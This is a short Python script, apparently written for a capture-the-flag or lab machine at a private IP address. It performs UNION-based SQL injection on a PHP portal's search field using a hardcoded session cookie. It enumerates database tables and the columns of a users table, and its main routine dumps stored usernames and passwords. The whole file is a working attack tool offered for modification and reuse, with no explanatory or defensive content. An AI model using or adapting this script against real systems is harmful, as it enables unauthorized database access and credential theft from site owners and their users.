import requests
from bs4 import BeautifulSoup

phpsessid = "n9mf4v7dl6so9dagqkp4nlc455"
url = "http://10.10.88.164/portal.php"

def makeRequest(payload):
    headers = {
                "Cookie":"PHPSESSID="+phpsessid
            }
    data = {
                "searchitem":payload
            }
    response = requests.post(url, headers=headers, data=data)
    return response

def enumTables():
    response = makeRequest("' UNION SELECT 'test1', table_name, null FROM information_schema.tables -- - ")
    soup = BeautifulSoup(response.content, "html5lib")
    results = soup.find_all("td")
    i = 1
    while i < len(results):
        print(results[i].get_text())
        i += 1

def enumUsersTable():
    response = makeRequest("' UNION SELECT 'test1', column_name, null FROM information_schema.columns WHERE table_name = 'users' -- - ")
    soup = BeautifulSoup(response.content, "html5lib")
    results = soup.find_all("td")
    i = 1
    while i < len(results):
        print(results[i].get_text())
        i += 1

if __name__ == "__main__":
    response = makeRequest("' UNION SELECT 'test1', username, pwd FROM users -- - ")
    soup = BeautifulSoup(response.content, "html5lib")
    results = soup.find_all("td")
    i = 1
    while i < len(results):
        print(results[i].get_text())
        i += 1
    #enumTables()
    #enumUsersTable()
    #YOU ARE FREE TO MODIFY THE SCRIPT TO SEE THINGS FOR YOURSELF :)
